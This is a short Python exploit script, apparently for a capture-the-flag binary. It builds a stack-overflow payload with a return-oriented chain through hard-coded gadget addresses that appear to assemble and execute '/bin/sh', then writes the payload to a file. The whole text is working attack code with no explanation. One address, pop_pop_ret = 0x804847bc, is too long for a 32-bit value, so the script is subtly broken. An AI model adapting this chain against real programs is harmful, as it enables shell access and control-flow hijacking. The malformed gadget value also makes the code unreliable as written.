import struct

pop_ret = 0x8048474
pop_pop_ret = 0x804847bc
exec_string = 0x0804842b
add_bin = 0x08048443
add_sh = 0x0804847e

payload =  "A"*0x6c
payload += "BBBB"

payload += struct.pack("I", add_bin)
payload += struct.pack("I", pop_ret)
payload += struct.pack("I", 0xdeadbeef)

payload += struct.pack("I", add_sh)
payload += struct.pack("I", pop_pop_ret)
payload += struct.pack("I", 0xcafebabe)
payload += struct.pack("I", 0xbadf00d)

payload += struct.pack("I", exec_string)

with file("payload", "wb") as f:
  f.write(payload)
